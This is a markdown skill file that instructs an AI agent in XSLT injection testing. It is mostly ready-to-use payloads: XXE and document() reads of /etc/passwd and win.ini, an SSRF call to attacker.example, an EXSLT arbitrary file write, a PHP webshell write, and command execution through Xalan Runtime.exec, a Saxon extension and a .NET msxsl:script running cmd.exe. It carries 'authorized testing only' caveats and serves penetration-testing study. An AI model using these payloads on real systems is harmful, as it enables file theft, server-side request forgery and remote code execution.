---
name: xslt-injection
description: >-
  XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
---

# SKILL: XSLT Injection — Testing Playbook

> **AI LOAD INSTRUCTION**: XSLT injection occurs when **attacker-influenced XSLT** is compiled/executed server-side. Map the **processor family** first (Java/.NET/PHP/libxslt). Then chain **document()**, **external entities**, **EXSLT**, or **embedded script/extension functions** per platform. **Authorized testing only**; many payloads are destructive. Routing note: if input is generic XML parsing and may not flow through XSLT, cross-load `xxe-xml-external-entity`; if you care about outbound `document(http:...)` requests, cross-load `ssrf-server-side-request-forgery`.

---

## 0. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§1).
4. **Escalate** by family: **document()** / **XXE** (§2–3), **EXSLT write** (§4), **PHP** (§5), **Java** (§6), **.NET** (§7).

**Quick probe** (harmless marker):

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. VENDOR DETECTION

Use standard **system-property** reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Typical fingerprints** (examples, not exhaustive):

| Signal | Possible engine |
|--------|------------------|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon |
| `libxslt` / GNOME stack | libxslt (C, often via PHP, nginx modules, etc.) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

Use results to select §5–§7 paths.

---

## 2. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows **DTD-based entities** in the stylesheet or source when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors (see §3).

---

## 3. FILE READ VIA `document()`

`document()` loads another XML document into a node-set; local files often parse as XML (noisy) but **errors and partial reads** may still leak.

**Unix example**:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows example**:

```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band**:

```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with **error-based** or **timing** observations if inline data does not return to the client.

---

## 4. FILE WRITE VIA EXSLT (`exslt:document`)

When **EXSLT common** extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often **RCE** via webroot, cron paths, or inclusion points.

---

## 5. RCE VIA PHP (`php:function`)

Requires PHP XSLT with **`registerPHPFunctions()`**-style exposure (application misconfiguration). Namespace:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing**:

```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Dangerous patterns** (historical abuses — verify only in lab):

- `php:function('assert', string($payload))` — environment-dependent, often deprecated/removed; chained with `include`/`require` in old apps.
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — **webshell write** when callable is whitelisted recklessly.
- `preg_replace` with **`/e`** modifier (legacy PHP) — the replacement string is **evaluated as PHP**; metasploit-style chains often wrapped **base64_decode** of a blob to smuggle a **meterpreter** (or other) staged payload. Removed in PHP 7+; only relevant for ancient runtimes.

**Legacy PHP equivalent** (illustrates the `/e` + base64 pattern — lab only):

```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

Surface from XSLT only if `php:function` exposes `preg_replace` to user stylesheets (rare + critical misconfiguration).

**Tester note**: modern PHP hardening often **blocks** these; absence of RCE does not remove **document()** / **XXE**.

---

## 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)

Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.

**Illustrative pattern** (conceptual — adjust to permitted extension namespace and API):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style static Java integration** (highly configuration-dependent):

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).

**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere — not every XSLT endpoint runs with extensions on.

---

## 7. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT **script blocks** are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**Default secure configs** often disable scripts — treat this as **when enabled** behavior.

---

## 8. DECISION TREE

```text
                    User influences XSLT or XML transform?
                                    |
                                   NO --> stop (out of scope)
                                    |
                                   YES
                                    |
                    +---------------+---------------+
                    |                               |
             output reflects                       no reflection
             injected logic?                    try blind channels
                    |                               |
                    v                               v
            system-property()                 errors, OOB, timing
            fingerprint vendor                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/file
    EXSLT write  extensions?      |                   |
        |           |           C# Process         EXSLT?
        v           v           v                   v
    file R/W     rt/exec      cmd.exe /c         map evidence
```

---

## Payloads All The Things (PAT) Note

The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains — exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible.

---

## Tooling (practical)

| Category | Examples |
|----------|----------|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads, observe responses and errors |
| XML/XSLT lab | Match **exact** processor (PHP libxslt, Java Saxon version, .NET framework) in a VM |
| Out-of-band | Collaborator / private callback server for `document('http://…')` |

No single universal scanner replaces **version-specific** behavior validation.

---

## Related

- **xxe-xml-external-entity** — DTD/entity hardening, generic XML parsers (`../xxe-xml-external-entity/SKILL.md`).
- **ssrf-server-side-request-forgery** — when `document(http:…)` or entity URLs cause server fetches (`../ssrf-server-side-request-forgery/SKILL.md`).
